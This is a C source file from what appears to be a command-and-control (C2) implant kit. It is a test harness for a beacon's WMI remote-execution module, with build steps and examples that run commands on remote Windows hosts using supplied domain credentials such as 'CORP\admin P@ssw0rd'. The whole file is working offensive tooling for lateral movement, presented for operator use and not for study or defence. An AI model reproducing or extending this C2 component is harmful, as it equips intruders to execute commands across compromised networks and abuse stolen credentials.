/*
 * csdev :: wmi_test.c  --  native wmiexec console self-test
 * ==========================================================================
 * Development tool only: not part of any payload. Lets ops_wmiexec be driven
 * without the full C2 loop.
 *
 * Build:
 *   gcc -O2 -Wall -I..\kits\beacon -o wmi_test.exe wmi_test.c
 *       ..\kits\beacon\wmi.c ..\kits\crypto\aes.c ..\kits\crypto\sha256.c
 *       ..\kits\crypto\rsa.c -ladvapi32
 *
 * Usage:
 *   wmi_test.exe <host> <cmd> [user] [pass] [domain]
 *   wmi_test.exe --cmdline "<raw args, as the C2 would send them>"
 *
 * Examples:
 *   wmi_test.exe 127.0.0.1 "whoami"
 *   wmi_test.exe 10.0.0.9 "ipconfig" CORP\\admin P@ssw0rd CORP
 *   wmi_test.exe --cmdline "127.0.0.1 cmd /c whoami"
 * ==========================================================================
 */
#include <stdio.h>
#include <string.h>
#include <windows.h>

#include "wmi.h"

int main(int argc, char **argv)
{
    static unsigned char out[400000];
    unsigned int n;

    if (argc < 2) {
        printf("usage: wmi_test <host> <cmd> [user] [pass] [domain]\n");
        printf("       wmi_test --cmdline \"<args>\"\n");
        return 1;
    }

    if (strcmp(argv[1], "--cmdline") == 0) {
        if (argc < 3) { printf("missing args\n"); return 1; }
        n = ops_wmiexec_cmdline(argv[2], out, sizeof(out) - 1);
    } else {
        if (argc < 3) { printf("missing cmd\n"); return 1; }
        n = ops_wmiexec(argv[1],
                        (argc >= 4) ? argv[3] : NULL,
                        (argc >= 6) ? argv[5] : NULL,
                        (argc >= 5) ? argv[4] : NULL,
                        argv[2], out, sizeof(out) - 1);
    }

    out[n] = 0;
    printf("---- %u bytes ----\n%s\n", n, (char *)out);
    return n ? 0 : 2;
}
